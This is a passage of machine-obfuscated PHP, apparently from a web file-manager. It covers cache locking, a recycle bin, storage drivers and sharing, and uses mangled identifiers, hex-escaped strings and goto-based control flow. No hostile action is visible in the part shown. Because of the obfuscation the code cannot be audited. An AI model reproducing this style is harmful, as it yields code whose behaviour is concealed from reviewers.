$ø«≤ÄÙô[114]; } return $»·πì˝ö; } public function getLastInsertId() { $ë˙ìßû¯ =& $_SERVER[ëæªã÷]; switch ($this->dbType) { case $ë˙ìßû¯[920]: case $ë˙ìßû¯[912]: case $ë˙ìßû¯[893]: case $ë˙ìßû¯[911]: case $ë˙ìßû¯[895]: case $ë˙ìßû¯[923]: return $this->_linkID->lastInsertId(); case $ë˙ìßû¯[894]: case $ë˙ìßû¯[896]: $Ìƒú‡‚Î = $this->table; $∑‰ Ö¥Á = $this->query("\x53\105\x4c\105\x43\124\x20{$Ìƒú‡‚Î}\56\143\165\x72\x72\x76\141\x6c\x20\143\x75\x72\x72\x76\x61\x6c\40\106\122\117\x4d\x20\144\x75\x61\154"); return $∑‰ Ö¥Á ? $∑‰ Ö¥Á[0][$ë˙ìßû¯[935]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¨Ÿ©£ë™) { $™ÒàÂ≈˘ =& $_SERVER[ëæªã÷]; if (!CacheLock::fileLock($™ÒàÂ≈˘[13])) { return !1; } $≈±ñ§¨‹ = parent::query($¨Ÿ©£ë™); CacheLock::fileUnLock($™ÒàÂ≈˘[13]); return $≈±ñ§¨‹; } public function execute($˙à°◊≥‡) { $êùØÒ€Õ =& $_SERVER[ëæªã÷]; if (!CacheLock::fileLock($êùØÒ€Õ[13])) { return !1; } $èóÎ⁄Ì± = parent::execute($˙à°◊≥‡); CacheLock::fileUnLock($êùØÒ€Õ[13]); return $èóÎ⁄Ì±; } } goto a‚¯ÿ¨¬‘ã; f¶õ“âæÿ∑: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $∂ßñºÚ¶ =& $_SERVER[ëæªã÷]; $¬ô©˛¸˘ = $GLOBALS[$∂ßñºÚ¶[6]][$∂ßñºÚ¶[353]]; self::$cachePath = $¬ô©˛¸˘[$∂ßñºÚ¶[202]][$∂ßñºÚ¶[88]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ñè‰Á–Ù, $è¡€ ÁŸ = 0) { $¯¸Êà¬— =& $_SERVER[ëæªã÷]; $ñ≠Àáâ£ = microtime(!0); $ƒ÷®ÊãÜ = $ñ≠Àáâ£ + $è¡€ ÁŸ + 0.0001; $∂Ë‰—ò◊ = rtrim(self::$cachePath, $¯¸Êà¬—[8]) . $¯¸Êà¬—[839] . md5($ñè‰Á–Ù) . $¯¸Êà¬—[836]; if (file_exists($∂Ë‰—ò◊) && filemtime($∂Ë‰—ò◊) && filemtime($∂Ë‰—ò◊) < time() - 10) { @unlink($∂Ë‰—ò◊); } do { if (file_exists($∂Ë‰—ò◊)) { cacheLockWait(); continue; } $ùÎíéÑî = fopen($∂Ë‰—ò◊, $¯¸Êà¬—[840]); if (!$ùÎíéÑî) { return !1; } $˚æÑ◊Ì» = flock($ùÎíéÑî, LOCK_EX | LOCK_NB); self::$caches[$ñè‰Á–Ù] = array($¯¸Êà¬—[841] => $ùÎíéÑî, $¯¸Êà¬—[202] => $∂Ë‰—ò◊); fwrite($ùÎíéÑî, $ƒ÷®ÊãÜ); clearstatcache(); if ($ùÎíéÑî && $˚æÑ◊Ì») { return !0; } cacheLockWait(); } while (microtime(!0) < $ƒ÷®ÊãÜ); $this->unlock($ñè‰Á–Ù); return !1; } public function lockGet($˙úÙ⁄Ú©) { $â´°ú‰ƒ =& $_SERVER[ëæªã÷]; $¨ˆ¸¬ÒÈ = rtrim(self::$cachePath, $â´°ú‰ƒ[8]) . $â´°ú‰ƒ[839] . md5($˙úÙ⁄Ú©) . $â´°ú‰ƒ[836]; return file_exists($¨ˆ¸¬ÒÈ); } public function unlock($¨ë„¢â∑) { $ƒ∂‰‘†‡ =& $_SERVER[ëæªã÷]; $‡ºÜ¶Œí = self::$caches[$¨ë„¢â∑]; if (!$‡ºÜ¶Œí) { return; } @flock($‡ºÜ¶Œí[$ƒ∂‰‘†‡[841]], LOCK_UN); @fclose($‡ºÜ¶Œí[$ƒ∂‰‘†‡[841]]); @unlink($‡ºÜ¶Œí[$ƒ∂‰‘†‡[202]]); unset(self::$caches[$¨ë„¢â∑]); } } class CacheLockRedis { public function lock($ı≤Ã¬Âë, $Ííæïá¸ = 10) { $∫€Ÿ÷™‘ = Cache::init(); $Ôù™Ü˚Œ = microtime(!0) + $Ííæïá¸; while (microtime(!0) < $Ôù™Ü˚Œ) { $∆Õ≥„À¯ = $∫€Ÿ÷™‘->get($ı≤Ã¬Âë); if (!$∆Õ≥„À¯) { $Ü–Ÿ¡… = $∫€Ÿ÷™‘->setLock($ı≤Ã¬Âë, $Ôù™Ü˚Œ, $Ííæïá¸); if ($Ü–Ÿ¡…) { return !0; } } else { if ($∆Õ≥„À¯ < microtime(!0)) { $∫€Ÿ÷™‘->set($ı≤Ã¬Âë, $Ôù™Ü˚Œ, $Ííæïá¸ * 2); if ($∫€Ÿ÷™‘->get($ı≤Ã¬Âë) === $∆Õ≥„À¯) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($†Ò”íæö) { return Cache::init()->get($†Ò”íæö); } public function unlock($»Æè˘ÜË) { return Cache::init()->remove($»Æè˘ÜË); } } goto d•Ωÿ≥—†‚; BôÉ¢¿È±á: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\145\137\x72\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\151\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\157\x6e")); public function listData($„„Î®Ô‘ = false) { $ê˜µ¢ÁÈ =& $_SERVER[ëæªã÷]; $„„Î®Ô‘ = $„„Î®Ô‘ ? $„„Î®Ô‘ : USER_ID; $≥˘æö‚« = $this->where(array($ê˜µ¢ÁÈ[1619] => $„„Î®Ô‘))->select(); return array_to_keyvalue($≥˘æö‚«, $ê˜µ¢ÁÈ[12], $ê˜µ¢ÁÈ[403]); } public function moveToRecycle($‰üË¿ºÖ) { $ë•Æ¶ñÃ =& $_SERVER[ëæªã÷]; $ΩÎπŒ©Ω = Model($ë•Æ¶ñÃ[1301]); $Ö„µ“È€ = $ΩÎπŒ©Ω->sourceInfo($‰üË¿ºÖ); if (!$Ö„µ“È€ || $Ö„µ“È€[$ë•Æ¶ñÃ[431]] == $ë•Æ¶ñÃ[99]) { return; } $áÆ≤è«Í = array($ë•Æ¶ñÃ[418] => $‰üË¿ºÖ, $ë•Æ¶ñÃ[1619] => USER_ID, $ë•Æ¶ñÃ[580] => $Ö„µ“È€[$ë•Æ¶ñÃ[412]], $ë•Æ¶ñÃ[581] => $Ö„µ“È€[$ë•Æ¶ñÃ[504]], $ë•Æ¶ñÃ[584] => $Ö„µ“È€[$ë•Æ¶ñÃ[521]]); $this->add($áÆ≤è«Í); $this->recycleMove($‰üË¿ºÖ, 1); if ($Ö„µ“È€[$ë•Æ¶ñÃ[411]] == $ë•Æ¶ñÃ[99]) { $âÀı°®Ö = array($ë•Æ¶ñÃ[584] => array($ë•Æ¶ñÃ[544], $Ö„µ“È€[$ë•Æ¶ñÃ[521]] . $‰üË¿ºÖ . $ë•Æ¶ñÃ[545])); $ΩÎπŒ©Ω->where($âÀı°®Ö)->setField($ë•Æ¶ñÃ[431], 1); } } public function clear() { $this->remove(!1); } public function remove($û÷ó˘ÆÀ = false, $Í¥∂êﬁÍ = false) { $‹˘‹Å˚è =& $_SERVER[ëæªã÷]; $Í¥∂êﬁÍ = $Í¥∂êﬁÍ ? $Í¥∂êﬁÍ : USER_ID; $”Í˚ Æ— = Model($‹˘‹Å˚è[1301]); $ä≠É‹áó = $this->listData($Í¥∂êﬁÍ); $û÷ó˘ÆÀ = $û÷ó˘ÆÀ === !1 ? !1 : $û÷ó˘ÆÀ; $®˛Û©¥∏ = array(); foreach ($ä≠É‹áó as $∫˘…⁄òï) { if ($û÷ó˘ÆÀ != !1 && !in_array($∫˘…⁄òï, $û÷ó˘ÆÀ)) { continue; } $Îñà„⁄ƒ = $”Í˚ Æ—->sourceInfo($∫˘…⁄òï); $”Í˚ Æ—->remove($∫˘…⁄òï, !1); $”çíË—ı = $Îñà„⁄ƒ[$‹˘‹Å˚è[412]] . $‹˘‹Å˚è[11] . $Îñà„⁄ƒ[$‹˘‹Å˚è[504]]; $®˛Û©¥∏[$”çíË—ı] = array($‹˘‹Å˚è[580] => $Îñà„⁄ƒ[$‹˘‹Å˚è[412]], $‹˘‹Å˚è[504] => $Îñà„⁄ƒ[$‹˘‹Å˚è[504]]); $this->where(array($‹˘‹Å˚è[403] => $∫˘…⁄òï))->delete(); } foreach ($®˛Û©¥∏ as $∏ü·È¥≠) { $”Í˚ Æ—->targetSpaceUpdate($∏ü·È¥≠[$‹˘‹Å˚è[412]], $∏ü·È¥≠[$‹˘‹Å˚è[504]]); } } public function restore($Ω¨È«“± = false) { $ª·©èœ´ = $this->listData(); $this->_restoreSource($ª·©èœ´, $Ω¨È«“±); } public function removeUserAll($ÃÄÖ‘∑’) { $this->remove(!1, $ÃÄÖ‘∑’); } private function _restoreSource($â˝Ëπƒ€, $˝È˘É‹√) { $∫óÇã©£ =& $_SERVER[ëæªã÷]; $ø◊ÜöÊŒ = Model($∫óÇã©£[1301]); $˝È˘É‹√ = $˝È˘É‹√ == !1 ? !1 : $˝È˘É‹√; if (!$â˝Ëπƒ€) { return !0; } $⁄®ìÒØô = array(); foreach ($â˝Ëπƒ€ as $òÜ¿ÕÆç) { if ($˝È˘É‹√ != !1 && !in_array($òÜ¿ÕÆç, $˝È˘É‹√)) { continue; } $â€ÙßÌÌ = $ø◊ÜöÊŒ->sourceInfo($òÜ¿ÕÆç); $”˚é‰õü = $ø◊ÜöÊŒ->sourceInfo($â€ÙßÌÌ[$∫óÇã©£[498]]); if ($”˚é‰õü[$∫óÇã©£[431]] == $∫óÇã©£[99]) { continue; } $ø◊ÜöÊŒ->lockMoveStart($òÜ¿ÕÆç); $this->recycleMove($òÜ¿ÕÆç, 0); if ($â€ÙßÌÌ[$∫óÇã©£[411]] == $∫óÇã©£[99]) { $äﬂÑ÷‰à = array($∫óÇã©£[584] => array($∫óÇã©£[544], $â€ÙßÌÌ[$∫óÇã©£[521]] . $òÜ¿ÕÆç . $∫óÇã©£[545])); $ø◊ÜöÊŒ->where($äﬂÑ÷‰à)->setField($∫óÇã©£[431], 0); $this->restoreFolderChildren($òÜ¿ÕÆç, $â˝Ëπƒ€); } $this->where(array($∫óÇã©£[403] => $òÜ¿ÕÆç))->delete(); $ø◊ÜöÊŒ->folderSizeReset($â€ÙßÌÌ[$∫óÇã©£[498]]); $⁄®ìÒØô[] = $â€ÙßÌÌ[$∫óÇã©£[498]]; if ($â€ÙßÌÌ[$∫óÇã©£[411]] == $∫óÇã©£[99]) { $⁄®ìÒØô[] = $òÜ¿ÕÆç; } $ø◊ÜöÊŒ->lockMoveEnd($òÜ¿ÕÆç); } $ø◊ÜöÊŒ->updateModifyTime($⁄®ìÒØô); } private function restoreFolderChildren($ÅÑ¡»ÎÇ, $ÔäáÂÑ◊) { $⁄ÜÛ¬ƒÂ =& $_SERVER[ëæªã÷]; $çÂüÉ∫— = Model($⁄ÜÛ¬ƒÂ[1301]); $´÷˚Ωæ¡ = array($⁄ÜÛ¬ƒÂ[403] => array($⁄ÜÛ¬ƒÂ[7], array())); foreach ($ÔäáÂÑ◊ as $Ê›ØõÆı) { if ($Ê›ØõÆı == $ÅÑ¡»ÎÇ) { continue; } if (!$çÂüÉ∫—->isParentOf($ÅÑ¡»ÎÇ, $Ê›ØõÆı)) { continue; } $ìÿÂ¥ä« = $çÂüÉ∫—->sourceInfo($Ê›ØõÆı); if ($ìÿÂ¥ä«[$⁄ÜÛ¬ƒÂ[411]] == $⁄ÜÛ¬ƒÂ[99]) { $´÷˚Ωæ¡[] = array($⁄ÜÛ¬ƒÂ[584] => array($⁄ÜÛ¬ƒÂ[544], $ìÿÂ¥ä«[$⁄ÜÛ¬ƒÂ[521]] . $Ê›ØõÆı . $⁄ÜÛ¬ƒÂ[545])); } else { $´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[403]][1][] = $Ê›ØõÆı; } } if (!$´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[403]][1]) { unset($´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[403]]); } if (!$´÷˚Ωæ¡) { return; } $´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[403]][1] = array_unique($´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[403]][1]); $´÷˚Ωæ¡[$⁄ÜÛ¬ƒÂ[976]] = $⁄ÜÛ¬ƒÂ[1891]; $çÂüÉ∫—->where($´÷˚Ωæ¡)->setField($⁄ÜÛ¬ƒÂ[431], 1); } private function recycleMove($≥°—Ôﬁ∑, $∂ªìÊâ… = 1) { $Ô™ñ∞ÀÆ =& $_SERVER[ëæªã÷]; $Œ‰ÜæÛ„ = Model($Ô™ñ∞ÀÆ[1301]); $Ô¥É–èæ = Model($Ô™ñ∞ÀÆ[2097]); $⁄áíƒ•º = array($Ô™ñ∞ÀÆ[403] => $≥°—Ôﬁ∑); if ($∂ªìÊâ…) { $Œ‰ÜæÛ„->where($⁄áíƒ•º)->setField($Ô™ñ∞ÀÆ[431], 1); $Ô¥É–èæ->eventRecycle($≥°—Ôﬁ∑, $Ô™ñ∞ÀÆ[2098]); } else { $∏ÉÇ‚ª÷ = $Œ‰ÜæÛ„->where($⁄áíƒ•º)->find(); $â∫Ù¥ﬂæ = $∏ÉÇ‚ª÷[$Ô™ñ∞ÀÆ[411]] == $Ô™ñ∞ÀÆ[99]; $ƒ•â¡Æˆ = $Œ‰ÜæÛ„->fileNameAuto($∏ÉÇ‚ª÷[$Ô™ñ∞ÀÆ[498]], $∏ÉÇ‚ª÷[$Ô™ñ∞ÀÆ[32]], REPEAT_RENAME_FOLDER, $â∫Ù¥ﬂæ); if ($ƒ•â¡Æˆ != $∏ÉÇ‚ª÷[$Ô™ñ∞ÀÆ[32]]) { $Œ‰ÜæÛ„->rename($≥°—Ôﬁ∑, $ƒ•â¡Æˆ); } $Œ‰ÜæÛ„->where($⁄áíƒ•º)->setField($Ô™ñ∞ÀÆ[431], 0); $Ô¥É–èæ->eventRecycle($≥°—Ôﬁ∑, $Ô™ñ∞ÀÆ[2099]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\163\x6f\165\162\143\145\123\x65\x63\x72\x65\x74\114\151\163\x74"; public $field = array("\163\157\165\162\x63\x65\111\104", "\x74\x79\x70\x65\111\x44", "\143\162\145\x61\x74\x65\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\163\164\157\x72\x61\147\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\151\172\x65\115\141\x78", "\163\171\x73\x74\145\x6d", "\144\145\146\x61\x75\x6c\x74", "\144\x72\151\x76\145\x72", "\x63\x6f\x6e\146\x69\x67"); public function listData($≈äî¿√Å = false, $Ïå‚æé® = "\x6d\157\144\x69\x66\x79\x54\151\155\145", $∂õˆ≠Ñ¿ = false) { $∆ÇÕ”¡Ö =& $_SERVER[ëæªã÷]; $ÑÂê≥ﬂõ = parent::listData($≈äî¿√Å, $Ïå‚æé®, $∂õˆ≠Ñ¿); if ($≈äî¿√Å) { return $ÑÂê≥ﬂõ; } $˘ÿíƒñÂ = $this->ioSizeUseGet(array_to_keyvalue($ÑÂê≥ﬂõ, $∆ÇÕ”¡Ö[12], $∆ÇÕ”¡Ö[401])); foreach ($ÑÂê≥ﬂõ as $—ö˛·ÖÕ => $ƒ‚Ôë«√) { unset($ÑÂê≥ﬂõ[$—ö˛·ÖÕ][$∆ÇÕ”¡Ö[6]]); $ÑÂê≥ﬂõ[$—ö˛·ÖÕ][$∆ÇÕ”¡Ö[1785]] = isset($˘ÿíƒñÂ[$ƒ‚Ôë«√[$∆ÇÕ”¡Ö[401]]]) ? $˘ÿíƒñÂ[$ƒ‚Ôë«√[$∆ÇÕ”¡Ö[401]]] : 0; } return $ÑÂê≥ﬂõ; } public function ioSizeUseGet($ü¶—Ä†ä) { $¯∆®°ü⁄ =& $_SERVER[ëæªã÷]; if (!$ü¶—Ä†ä) { return array(); } $îıˆú‘Ç = $¯∆®°ü⁄[2100] . implode($¯∆®°ü⁄[50], $ü¶—Ä†ä); $·‚èÈìÁ = Cache::get($îıˆú‘Ç); if ($·‚èÈìÁ) { return $·‚èÈìÁ; } $Ü»ûñ∑π = array($¯∆®°ü⁄[797] => $¯∆®°ü⁄[401], $¯∆®°ü⁄[2101] => $¯∆®°ü⁄[90]); $ñ‘Ï‰ªÆ = array($¯∆®°ü⁄[797] => array($¯∆®°ü⁄[7], $ü¶—Ä†ä)); $·‚èÈìÁ = Model($¯∆®°ü⁄[769])->field($Ü»ûñ∑π)->where($ñ‘Ï‰ªÆ)->group($¯∆®°ü⁄[797])->select(); $·‚èÈìÁ = array_to_keyvalue($·‚èÈìÁ, $¯∆®°ü⁄[401], $¯∆®°ü⁄[90]); Cache::set($îıˆú‘Ç, $·‚èÈìÁ, 600); return $·‚èÈìÁ; } public function getConfig($Ïÿ‘÷˙Ò) { $ÔÖû„Æù = parent::listData($Ïÿ‘÷˙Ò); return json_decode($ÔÖû„Æù[$_SERVER[ëæªã÷][6]], !0); } public function update($ò˘¥Èå±, $∞†…ïÑ‰) { $∫â÷‡•≈ =& $_SERVER[ëæªã÷]; $¶ﬁ•≠‘â = $∞†…ïÑ‰[$∫â÷‡•≈[32]]; $ãò‚ÔÒﬂ = array_to_keyvalue(parent::listData(), $∫â÷‡•≈[32]); if (isset($ãò‚ÔÒﬂ[$¶ﬁ•≠‘â]) && $ãò‚ÔÒﬂ[$¶ﬁ•≠‘â][$∫â÷‡•≈[401]] != $ò˘¥Èå±) { return !1; } if (isset($∞†…ïÑ‰[$∫â÷‡•≈[2102]]) && $∞†…ïÑ‰[$∫â÷‡•≈[2102]] == $∫â÷‡•≈[99]) { $this->checkConfig($∞†…ïÑ‰); } unset($∞†…ïÑ‰[$∫â÷‡•≈[2102]]); $öÖ·ì¡å = parent::update($ò˘¥Èå±, $∞†…ïÑ‰); if ($öÖ·ì¡å && $∞†…ïÑ‰[$∫â÷‡•≈[37]]) { foreach ($ãò‚ÔÒﬂ as $áè∂°±ﬁ) { if ($áè∂°±ﬁ[$∫â÷‡•≈[37]] && $áè∂°±ﬁ[$∫â÷‡•≈[401]] != $ò˘¥Èå±) { parent::update($áè∂°±ﬁ[$∫â÷‡•≈[401]], array($∫â÷‡•≈[37] => 0)); } } } return $öÖ·ì¡å; } public function add($áºåê™®) { $ÃÕ≥õÍò =& $_SERVER[ëæªã÷]; $ä£¬¢¸ = array_to_keyvalue(parent::listData(), $ÃÕ≥õÍò[32]); if (isset($ä£¬¢¸[$áºåê™®[$ÃÕ≥õÍò[32]]])) { return !1; } $this->checkConfig($áºåê™®); $∂ﬁÑ≥Ò” = parent::insert($áºåê™®); if ($∂ﬁÑ≥Ò” && $áºåê™®[$ÃÕ≥õÍò[37]]) { foreach ($ä£¬¢¸ as $„®ÖÉ¥˝) { if ($„®ÖÉ¥˝[$ÃÕ≥õÍò[37]]) { parent::update($„®ÖÉ¥˝[$ÃÕ≥õÍò[401]], array($ÃÕ≥õÍò[37] => 0)); } } } return $∂ﬁÑ≥Ò”; } public function checkConfig(&$•—§ù∏í, $≈æƒ∫∑ú = false) { $ä˛àﬁ–≤ =& $_SERVER[ëæªã÷]; $åÕ¿ÑÂ  = strtolower($•—§ù∏í[$ä˛àﬁ–≤[106]]); $ÙŸ¡ﬁàú = json_decode($•—§ù∏í[$ä˛àﬁ–≤[6]], !0); foreach ($ÙŸ¡ﬁàú as $∫¢ï—ÎÜ => $Â¥ΩèÍ•) { $ÙŸ¡ﬁàú[$∫¢ï—ÎÜ] = trim($Â¥ΩèÍ•); } $ÙŸ¡ﬁàú[$ä˛àﬁ–≤[2103]] = rand_string(6); $‚ï¬±’˝ = $GLOBALS[$ä˛àﬁ–≤[6]][$ä˛àﬁ–≤[100]][$ä˛àﬁ–≤[806]]; $ÔëÜ¶ß  = isset($‚ï¬±’˝[$åÕ¿ÑÂ ]) ? $‚ï¬±’˝[$åÕ¿ÑÂ ] : ucfirst($åÕ¿ÑÂ ); $´¨≠ÙÄ∏ = $ä˛àﬁ–≤[84] . $ÔëÜ¶ß ; if (!$ÔëÜ¶ß  || !class_exists($´¨≠ÙÄ∏)) { if ($≈æƒ∫∑ú) { return LNG($ä˛àﬁ–≤[2104]); } write_log(array($ä˛àﬁ–≤[2105], $•—§ù∏í, get_caller_info()), $ä˛àﬁ–≤[2106]); show_json(LNG($ä˛àﬁ–≤[2104]), !1, $•—§ù∏í); } $õ˚ëÓ∑è = new $´¨≠ÙÄ∏($ÙŸ¡ﬁàú); if (in_array($åÕ¿ÑÂ , $õ˚ëÓ∑è->objectDriver)) { if (!$õ˚ëÓ∑è->isBucketCors() && !$õ˚ëÓ∑è->setBucketCors()) { $∞∆¯òîΩ = LNG($ä˛àﬁ–≤[2107]); $∞∆¯òîΩ .= $ä˛àﬁ–≤[2108] . LNG($ä˛àﬁ–≤[2109]); if ($≈æƒ∫∑ú) { return $∞∆¯òîΩ; } show_json($∞∆¯òîΩ, !1); } } $É≥Æ⁄™Ì = rtrim($ÙŸ¡ﬁàú[$ä˛àﬁ–≤[1155]], $ä˛àﬁ–≤[8]) . $ä˛àﬁ–≤[8]; $ﬁπ¸‹ß· = $õ˚ëÓ∑è->getPath($É≥Æ⁄™Ì . $ä˛àﬁ–≤[1217]); if (!$õ˚ëÓ∑è->mkfile($ﬁπ¸‹ß·)) { if ($≈æƒ∫∑ú) { return LNG($ä˛àﬁ–≤[2107]); } show_json(LNG($ä˛àﬁ–≤[2107]), !1); } $ÙŸ¡ﬁàú[$ä˛àﬁ–≤[1155]] = $É≥Æ⁄™Ì; $•—§ù∏í[$ä˛àﬁ–≤[6]] = json_encode($ÙŸ¡ﬁàú); $•—§ù∏í[$ä˛àﬁ–≤[106]] = $ÔëÜ¶ß ; return !0; } public function driverListSystem() { $±„˝ ∞‘ =& $_SERVER[ëæªã÷]; $É∫‡ªâ® = parent::listData(); $Àü»∑ï° = array(); foreach ($É∫‡ªâ® as $é∞∑·á¬) { unset($é∞∑·á¬[$±„˝ ∞‘[203]], $é∞∑·á¬[$±„˝ ∞‘[96]]); $é∞∑·á¬[$±„˝ ∞‘[6]] = json_decode($é∞∑·á¬[$±„˝ ∞‘[6]], !0); $Àü»∑ï°[] = $é∞∑·á¬; } return $Àü»∑ï°; } public function defaultDriver() { $æ’ç⁄Ÿ“ =& $_SERVER[ëæªã÷]; $ûó¸˛Ó⁄ = parent::listData(); $≤Œ•Ï£¿ = array_filter_by_field($ûó¸˛Ó⁄, $æ’ç⁄Ÿ“[37], 1); $≤Œ•Ï£¿ = $≤Œ•Ï£¿[0]; if ($≤Œ•Ï£¿) { $≤Œ•Ï£¿[$æ’ç⁄Ÿ“[6]] = json_decode($≤Œ•Ï£¿[$æ’ç⁄Ÿ“[6]], !0); } return $≤Œ•Ï£¿; } public function driverInfo($Âô«ü¢’) { $õ¡ Æ“‡ =& $_SERVER[ëæªã÷]; $±Ù≤⁄Æö = array_to_keyvalue(parent::listData(), $õ¡ Æ“‡[401]); if (!isset($±Ù≤⁄Æö[$Âô«ü¢’])) { return !1; } $Ùπ¸›äÓ = $±Ù≤⁄Æö[$Âô«ü¢’]; $Ùπ¸›äÓ[$õ¡ Æ“‡[6]] = json_decode($Ùπ¸›äÓ[$õ¡ Æ“‡[6]], !0); return $Ùπ¸›äÓ; } public function remove($ø∂ëÏí€) { $this->removeShareItems($ø∂ëÏí€); return parent::remove($ø∂ëÏí€); } public function removeWithFile($¢ﬁèÄœ¡, $€º˛™ôè) { $˚Ò‘ﬂ’¨ =& $_SERVER[ëæªã÷]; $˚ΩÏıã£ = array($˚Ò‘ﬂ’¨[797] => $¢ﬁèÄœ¡); $ì¶°ö¬â = Model($˚Ò‘ﬂ’¨[470])->where($˚ΩÏıã£)->count(); $çã≈ê∞ê = Model($˚Ò‘ﬂ’¨[470])->where($˚ΩÏıã£)->sum($˚Ò‘ﬂ’¨[90]); $Öú≤Ï‚∞ = $€º˛™ôè . $˚Ò‘ﬂ’¨[2110] . $¢ﬁèÄœ¡; $¸˝º “˙ = new TaskFileTransfer($Öú≤Ï‚∞, $˚Ò‘ﬂ’¨[2106], $ì¶°ö¬â, LNG($˚Ò‘ﬂ’¨[2111]) . "\50{$¢ﬁèÄœ¡}\x29"); $¸˝º “˙->task[$˚Ò‘ﬂ’¨[743]] = (double) $çã≈ê∞ê; $∂≈éÕâ = KodIO::defaultDriver(); $°Œ€àáê = $∂≈éÕâ[$˚Ò‘ﬂ’¨[401]]; $≤˘ÀÔ˚— = "\173\151\x6f\72{$°Œ€àáê}\175\57"; $«øàÒı· = !0; $”«À˝Õ» = array(); $òöŸØÏ¬ = Model($˚Ò‘ﬂ’¨[202])->where($˚ΩÏıã£)->field($˚Ò‘ﬂ’¨[2112])->select(); foreach ($òöŸØÏ¬ as $Æ‚´˛◊ò) { $ôßﬁ•ïÕ = $Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[88]]; $ò’«Êß = $≤˘ÀÔ˚— . str_replace("\x7b\151\x6f\72{$¢ﬁèÄœ¡}\175\x2f", $˚Ò‘ﬂ’¨[12], $ôßﬁ•ïÕ); if (!IO::exist($ôßﬁ•ïÕ)) { $”«À˝Õ»[] = $Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[467]]; $¸˝º “˙->updateFileEnd($Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[32]], $Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[90]]); continue; } if (IO::exist($ò’«Êß)) { $¸˝º “˙->updateFileEnd($Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[32]], $Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[90]]); continue; } if (!IO::move($ôßﬁ•ïÕ, get_path_father($ò’«Êß))) { $«øàÒı· = !1; break; } $˚ΩÏıã£ = array($˚Ò‘ﬂ’¨[467] => $Æ‚´˛◊ò[$˚Ò‘ﬂ’¨[467]]); $˝ûË‘È© = array($˚Ò‘ﬂ’¨[797] => $°Œ€àáê, $˚Ò‘ﬂ’¨[88] => $ò’«Êß); Model($˚Ò‘ﬂ’¨[202])->where($˚ΩÏıã£)->save($˝ûË‘È©); } $this->removeByFileID($”«À˝Õ»); if (!$«øàÒı·) { $¸˝º “˙->stop($Öú≤Ï‚∞); return !1; } $¸˝º “˙->end(); if ($€º˛™ôè == $˚Ò‘ﬂ’¨[1765]) { $this->remove($¢ﬁèÄœ¡); } } public function progress($í÷¡Ù·€, $∑˘∂¸ÿÀ) { return Task::get($∑˘∂¸ÿÀ . $_SERVER[ëæªã÷][2110] . $í÷¡Ù·€); } private function removeByFileID($Üê‘˝Ââ = array()) { $¡∏ú±–ò =& $_SERVER[ëæªã÷]; if (empty($Üê‘˝Ââ)) { return; } $—¸›≠Ω° = array($¡∏ú±–ò[467] => array($¡∏ú±–ò[7], $Üê‘˝Ââ)); $©üÓùëÃ = Model($¡∏ú±–ò[1301])->where($—¸›≠Ω°)->field($¡∏ú±–ò[403])->select(); if (!$©üÓùëÃ) { return; } $©üÓùëÃ = array_to_keyvalue($©üÓùëÃ, $¡∏ú±–ò[12], $¡∏ú±–ò[403]); foreach ($©üÓùëÃ as $ü›ÚÒë†) { Model($¡∏ú±–ò[417])->removeNow($ü›ÚÒë†, !1); } } private function removeShareItems($·”∆Ô›é) { $ìò∆è†” =& $_SERVER[ëæªã÷]; $Ÿ⁄íÿ˛Ò = "\x7b\151\157\x3a{$·”∆Ô›é}\175\57"; $óƒáâ´® = array($ìò∆è†”[403] => 0, $ìò∆è†”[1150] => array($ìò∆è†”[387], "{$Ÿ⁄íÿ˛Ò}\x25")); $ü∏ÕÉá° = Model($ìò∆è†”[1776])->where($óƒáâ´®)->field($ìò∆è†”[488])->select(); if (empty($ü∏ÕÉá°)) { return; } $ã˙Ú¡ÿŸ = array_to_keyvalue($ü∏ÕÉá°, $ìò∆è†”[12], $ìò∆è†”[488]); Model($ìò∆è†”[595])->remove($ã˙Ú¡ÿŸ); } } goto aÀãúâñ€ü; FÙ°òå‚¯õ: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\151\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\164\x2c\x75\160\x64\141\164\x65", "\146\165\x6e\x63\x74\151\x6f\156"), array("\143\162\145\x61\x74\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\156\143\x74\151\157\x6e"), array("\x6f\160\164\151\157\156\x73", '', "\x69\x6e\163\145\x72\x74\54\165\x70\x64\x61\x74\x65\x2c\x73\x65\154\x65\x63\x74", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¬ﬁÒÄëŒ) { $™⁄∂∆Å∆ =& $_SERVER[ëæªã÷]; $ÅåäÍÁΩ = isset($¬ﬁÒÄëŒ[0]) ? $¬ﬁÒÄëŒ[0] : !1; return array($™⁄∂∆Å∆[1930] => array(USER_ID, $™⁄∂∆Å∆[1931]), $™⁄∂∆Å∆[1875] => array($ÅåäÍÁΩ, $™⁄∂∆Å∆[1932])); } protected function listSimple() { $à√·ˆ˚Õ = array($_SERVER[ëæªã÷][1628] => USER_ID); $ÍƒÇÙ‰÷ = $this->field($this->fieldList)->where($à√·ˆ˚Õ)->select(); return 